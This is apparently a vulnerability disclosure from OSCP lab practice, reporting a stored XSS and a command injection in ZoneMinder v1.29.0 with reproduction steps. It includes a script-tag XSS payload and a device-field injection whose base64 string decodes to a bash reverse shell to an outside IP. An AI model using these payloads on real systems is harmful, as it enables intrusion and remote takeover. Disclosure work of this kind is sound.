# Stored XSS and RCE in ZoneMinder console v1.29.0

Found these two whilst preparing for the OSCP and doing the `Pebbles` box.

Not sure if this has been reported elsewhere, other vulnerabilities are similar but not the same (e.g. CVE-2023-26035 - Involves injecting in the Monitor ID while creating a snapshot, [ExploitDB](https://www.exploit-db.com/exploits/41239) - Involves reflected XSS, not stored)

# To reproduce
Not sure if you need to auth, as the box had no authentication. Although with the other vulnerabilities authentication is useless for this version anyway.

In a ZoneMinder installation.
## XSS
- Go to /index.php?view=options&tab=web
- Set WEB_TITLE_PREFIX to ZM </title><script>alert(1)</script>
- Save
- Visit any page and confirm the alert appears.


## RCE
This is a different method I found compared to the normal RCE route people have used in writeups I found.
- Press Add New Monitor
- In the Device set device ID to `/dev/video2;[COMMAND];#`
- E.g. `/dev/video2;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4Ny84MCAwPiYxCg=='|base64 -d|bash;#`
The parameter is being passed like this to the command
```bash
sh -c /usr/bin/zmdc.pl stop zmc -d [DEVICE PATH]
```
with no escaping so it treats the ';' as literal.
